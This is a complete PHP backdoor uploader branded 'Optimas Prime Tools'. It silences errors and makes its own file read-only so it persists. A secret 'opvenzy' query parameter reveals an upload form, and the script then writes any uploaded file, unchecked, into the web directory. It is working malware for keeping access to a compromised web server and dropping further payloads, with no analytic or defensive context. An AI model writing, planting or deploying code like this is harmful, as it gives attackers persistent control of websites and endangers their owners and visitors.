<?php
error_reporting(0);
chmod(basename($_SERVER["PHP_SELF"]), 0444);
echo "<div style='text-align: center; margin-top: 20%;'>";
echo "?>Optimas Prime Tools <br> <a href='https://t.me/optimasprimetools' target='_blank'>https://t.me/optimasprimetools</a><br><br>";
if (isset($_GET["opvenzy"])) {
    echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader" style="display: inline-block;">';
    echo '<input type="file" name="file" size="30" style="display: inline-block;">';
    echo '<input name="_upl" type="submit" id="_upl" value="Upload" style="display: inline-block; margin-left: 10px;">';
    echo '</form>';
    if ($_POST['_upl'] == "Upload") {
        if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
            echo 'S';
        } else {
            echo 'F';
        }
    }
}
echo "</div>";
?>